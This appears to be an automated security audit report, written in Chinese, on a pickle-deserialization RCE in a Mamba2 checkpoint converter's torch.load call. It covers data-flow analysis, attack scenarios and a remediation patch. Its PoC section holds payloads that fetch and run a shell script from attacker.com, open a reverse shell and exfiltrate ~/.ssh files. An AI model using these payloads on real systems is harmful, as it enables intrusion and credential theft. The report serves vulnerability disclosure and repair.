# 深度利用分析报告: VULN-SEC-CKPT-001

## 漏洞基本信息

| 字段 | 值 |
|------|-----|
| **漏洞ID** | VULN-SEC-CKPT-001 |
| **CWE** | CWE-502 (Deserialization of Untrusted Data) |
| **严重性** | Critical |
| **置信度** | 85/100 |
| **位置** | `mindspeed_llm/tasks/checkpoint/convert_ckpt_mamba2.py:87-88` |
| **函数** | `load_hf_files_to_dict` |
| **模块** | checkpoint_conversion |

---

## 漏洞原理详解

### Pickle 反序列化 RCE 机制

Python 的 `pickle` 模块使用 `__reduce__()` 方法序列化复杂对象。当 `torch.load()` 使用 `weights_only=False` 时，会调用标准 pickle unpickler，允许执行任意代码。

**核心原理**:
```python
class MaliciousPayload:
    def __reduce__(self):
        # 反序列化时自动执行
        return (function, (args,))
```

当 unpickler 遇到 `REDUCE` opcode 时，会调用指定函数并传入参数，实现任意代码执行。

---

## 漏洞代码

```python
# mindspeed_llm/tasks/checkpoint/convert_ckpt_mamba2.py:78-88
@staticmethod
def load_hf_files_to_dict(directory_path):
    model_dict = {}
    loaded = False

    for filename in os.listdir(directory_path):  # directory_path 来自 CLI
        file_path = os.path.join(directory_path, filename)

        try:
            if filename.endswith(".bin"):
                # 危险！无 weights_only=True，默认允许 pickle RCE
                cur_weights = torch.load(file_path, map_location=torch.device('cpu'))
                model_dict.update(cur_weights)
                print(f"Successfully loaded: {filename}")
                loaded = True
```

---

## 数据流分析

```
Source: CLI 参数 --load-dir
  ↓
args.load_dir (argparse)
  ↓
MambaConverter.__init__(): args.load_dir = args.load
  ↓
load_hf_files_to_dict(directory_path)
  ↓
os.listdir(directory_path) → 返回目录中的所有文件名
  ↓
file_path = os.path.join(directory_path, filename)
  ↓
torch.load(file_path, map_location=torch.device('cpu'))
  ↓ [SINK - weights_only 默认为 False]
Pickle 反序列化 → 可能执行任意代码
```

**关键问题**:
- `directory_path` 完全由用户 CLI 参数控制
- 无路径白名单验证
- 无文件完整性校验
- `torch.load()` 缺少 `weights_only=True`

---

## 攻击载荷构造 (PoC)

### Payload 1: 基础 RCE

```python
import torch
import os

class RCEPayload:
    def __reduce__(self):
        return (os.system, ('curl attacker.com/shell.sh | bash',))

# 创建恶意 checkpoint
malicious_checkpoint = {
    'model_state_dict': RCEPayload(),
    'config': {'hidden_size': 768}
}

torch.save(malicious_checkpoint, 'pytorch_model.bin')
```

**执行**:
```bash
python convert_ckpt.py --load-dir /path/to/malicious --model-type GPT
# → torch.load() 执行 → os.system('curl attacker.com/shell.sh | bash')
```

### Payload 2: 反向 Shell

```python
import torch
import socket
import subprocess
import os

class ReverseShell:
    def __reduce__(self):
        return (subprocess.Popen, (
            ['bash', '-c', 
             'bash -i >& /dev/tcp/attacker.com/4444 0>&1'],
            subprocess.PIPE, subprocess.PIPE, subprocess.PIPE
        ))

torch.save({'weights': ReverseShell()}, 'model.bin')
```

### Payload 3: 数据窃取

```python
import torch
import os

class DataExfil:
    def __reduce__(self):
        return (os.system, (
            'tar czf /tmp/data.tar.gz ~/.ssh ~/.bash_history && '
            'curl -X POST -F "file=@/tmp/data.tar.gz" attacker.com/upload'
        ))

torch.save({'layer.weight': DataExfil()}, 'pytorch_model.bin')
```

---

## 攻击场景描述

### 场景 1: 共享模型仓库污染

1. **攻击者**获得内部模型共享目录的写入权限
2. 在 `/shared/models/mamba/` 目录放置恶意 `pytorch_model.bin`
3. **用户**执行: `python convert_ckpt.py --load-dir /shared/models/mamba/`
4. `load_hf_files_to_dict()` 加载恶意文件 → RCE

### 场景 2: 供应链攻击

1. 攻击者在 HuggingFace Hub 发布"优化版"Mamba 模型
2. 用户下载模型到本地
3. 执行 checkpoint 转换时触发恶意代码
4. 系统被攻陷，攻击者获得持久化访问

### 场景 3: CI/CD 管道污染

1. 攻击者修改 CI pipeline 中的模型转换脚本
2. 在测试环境注入恶意 checkpoint
3. CI 自动执行转换 → 测试环境被攻陷
4. 通过测试环境渗透生产环境

---

## 利用条件

| 条件 | 是否满足 |
|------|----------|
| 用户可控文件路径 | ✓ (CLI --load-dir) |
| 无输入验证 | ✓ (无路径白名单) |
| weights_only=False | ✓ (默认值) |
| 文件类型仅检查后缀 | ✓ (.bin 即可) |
| 无完整性校验 | ✓ (无 hash/signature) |

---

## 修复建议

### 立即修复 (Critical)

```python
# 修复后代码
@staticmethod
def load_hf_files_to_dict(directory_path):
    from pathlib import Path
    import hashlib
    
    # 1. 路径白名单验证
    ALLOWED_DIRS = ['/models/official', '/checkpoints/verified']
    real_path = Path(directory_path).resolve()
    if not any(real_path.is_relative_to(d) for d in ALLOWED_DIRS):
        raise ValueError(f"Unauthorized checkpoint path: {directory_path}")
    
    model_dict = {}
    for filename in os.listdir(directory_path):
        file_path = os.path.join(directory_path, filename)
        
        if filename.endswith(".bin"):
            # 2. 强制使用 weights_only=True
            cur_weights = torch.load(
                file_path, 
                map_location=torch.device('cpu'),
                weights_only=True  # 关键修复！
            )
            model_dict.update(cur_weights)
        
        elif filename.endswith(".safetensors"):
            # 3. 优先使用 safetensors 格式
            from safetensors.torch import load_file
            cur_weights = load_file(file_path)
            model_dict.update(cur_weights)
    
    return model_dict
```

### 长期方案

1. **迁移到 safetensors 格式**: 完全消除 pickle RCE 风险
2. **实现 checkpoint 签名机制**: GPG/SSH 签名验证
3. **添加完整性校验**: SHA256 manifest 文件
4. **审计日志**: 记录所有 checkpoint 加载操作

---

## CVSS 评分预估

**CVSS 3.1**: **8.8 (High)**

| 指标 | 值 |
|------|-----|
| Attack Vector | Local (L) |
| Attack Complexity | Low (L) |
| Privileges Required | Low (L) |
| User Interaction | Required (R) |
| Scope | Unchanged (U) |
| Confidentiality | High (H) |
| Integrity | High (H) |
| Availability | High (H) |

---

## 相关 CVE 参考

- **CVE-2025-3243**: PyTorch weights_only RCE (PyTorch ≤ 2.5.1)
- **CVE-2026-24747**: weights_only unpickler memory corruption (PyTorch < 2.10.0)
- **CVE-2026-26220**: LightLLM WebSocket pickle RCE (CVSS 9.3)

---

**报告生成时间**: 2026-04-20  
**分析者**: Security Scanner Agent